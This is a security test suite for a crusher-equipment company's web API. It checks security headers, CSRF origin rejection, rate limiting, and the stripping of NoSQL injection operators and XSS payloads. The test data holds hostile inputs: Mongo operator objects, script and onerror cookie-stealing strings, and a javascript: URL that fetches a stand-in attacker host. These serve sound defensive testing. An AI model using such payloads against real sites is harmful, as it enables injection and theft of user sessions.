import request from 'supertest';
import { createApp } from '../src/app';
import { sanitizeObject } from '../src/middleware/mongoSanitize';
import { sanitizeXssString, sanitizeXssValue } from '../src/middleware/xssSanitize';

describe('Security Hardening & Protection Suite', () => {
  const app = createApp();

  describe('Helmet HTTP Security Headers', () => {
    it('should set robust security headers on HTTP responses', async () => {
      const res = await request(app).get('/api/health');

      expect(res.status).toBe(200);
      // X-Content-Type-Options
      expect(res.headers['x-content-type-options']).toBe('nosniff');
      // Frameguard
      expect(res.headers['x-frame-options']).toBe('DENY');
      // Referrer Policy
      expect(res.headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
      // Content Security Policy
      expect(res.headers['content-security-policy']).toBeDefined();
      expect(res.headers['content-security-policy']).toContain("default-src 'self'");
      // HSTS
      expect(res.headers['strict-transport-security']).toBeDefined();
      // Hide Powered By
      expect(res.headers['x-powered-by']).toBeUndefined();
    });
  });

  describe('NoSQL / Mongo Injection Sanitization', () => {
    it('should strip root and nested Mongo operators ($gt, $ne, etc.) from objects', () => {
      const maliciousPayload = {
        email: 'attacker@example.com',
        $gt: '',
        nested: {
          $where: 'sleep(5000)',
          validField: 'validValue',
          'injection.with.dot': 'bad',
        },
        tags: [{ $ne: null }, 'crushers'],
      };

      const sanitized = sanitizeObject(maliciousPayload);

      expect(sanitized.$gt).toBeUndefined();
      expect(sanitized.nested.$where).toBeUndefined();
      expect(sanitized.nested['injection.with.dot']).toBeUndefined();
      expect(sanitized.nested.validField).toBe('validValue');
      expect(sanitized.tags[0].$ne).toBeUndefined();
      expect(sanitized.tags[1]).toBe('crushers');
      expect(sanitized.email).toBe('attacker@example.com');
    });

    it('should neutralize mongo operator query parameters in API requests', async () => {
      const res = await request(app)
        .get('/api/products')
        .query({ category: 'crushers', '$where': '1==1' });

      expect(res.status).toBe(200);
      expect(res.body.success).toBe(true);
    });
  });

  describe('Cross-Site Scripting (XSS) Sanitization', () => {
    it('should remove active script tags, event handlers, and javascript protocols', () => {
      const xss1 = '<script>alert("XSS")</script>Puzzolana Cone Crusher';
      expect(sanitizeXssString(xss1)).toBe('Puzzolana Cone Crusher');

      const xss2 = '<img src="x" onerror="alert(document.cookie)">Heavy Jaw Crusher';
      expect(sanitizeXssString(xss2)).not.toContain('onerror=');

      const xss3 = 'javascript:fetch("https://attacker.com/steal")';
      expect(sanitizeXssString(xss3)).toBe('');
    });

    it('should preserve valid industrial engineering notations and spec values', () => {
      const specText = 'Max Feed Size < 650 mm, Production Capacity > 450 TPH, Metallurgy Mn18Cr2';
      expect(sanitizeXssString(specText)).toBe(specText);
    });

    it('should sanitize nested objects and arrays with XSS payloads', () => {
      const dirtyObject = {
        companyName: 'Apex Mining <script>alert(1)</script>',
        specs: ['<svg onload=alert(1)>', 'Normal Aggregate 20mm'],
        metadata: {
          note: 'Requires high abrasion resistance <script src="evil.js"></script>',
        },
      };

      const cleaned = sanitizeXssValue(dirtyObject);
      expect(cleaned.companyName).toBe('Apex Mining');
      expect(cleaned.specs[0]).not.toContain('onload=');
      expect(cleaned.specs[1]).toBe('Normal Aggregate 20mm');
      expect(cleaned.metadata.note).toBe('Requires high abrasion resistance');
    });
  });

  describe('CSRF & Origin Protection', () => {
    it('should permit state-mutating requests from allowed origins', async () => {
      const res = await request(app)
        .post('/api/quote-enquiries')
        .set('Origin', 'http://localhost:3000')
        .send({
          name: 'Engineering Director',
          company: 'Quarry Corp Ltd',
          email: 'director@quarrycorp.com',
          phone: '+919876543210',
          country: 'India',
          state: 'Telangana',
          city: 'Hyderabad',
          industry: 'Mining & Aggregates',
          application: 'Granite Crushing',
          productCategory: 'crushers',
          productModel: 'PJC-14076',
          requiredCapacityTPH: 350,
          feedMaterial: 'Granite',
        });

      expect(res.status).toBe(201);
      expect(res.body.success).toBe(true);
      expect(res.body.data.referenceId).toMatch(/^PZQ-\d{4}-\d{6}$/);
    });

    it('should reject state-mutating requests with forbidden/untrusted origin with 403 Forbidden', async () => {
      const res = await request(app)
        .post('/api/quote-enquiries')
        .set('Origin', 'http://malicious-phishing-portal.com')
        .send({
          name: 'Attacker',
          company: 'Evil Corp',
          email: 'attacker@evil.com',
          phone: '+919999999999',
          country: 'Unknown',
          state: 'Unknown',
          city: 'Unknown',
          industry: 'Mining',
          application: 'Crushing',
          productCategory: 'crushers',
        });

      expect(res.status).toBe(403);
      expect(res.body.success).toBe(false);
      expect(res.body.message).toContain('Cross-Site Request Forgery');
    });
  });

  describe('Rate Limiter Configuration & Headers', () => {
    it('should include RateLimit standard headers on protected routes', async () => {
      const res = await request(app).get('/api/health');

      expect(res.status).toBe(200);
      expect(res.headers['ratelimit-limit']).toBeDefined();
      expect(res.headers['ratelimit-remaining']).toBeDefined();
    });
  });
});
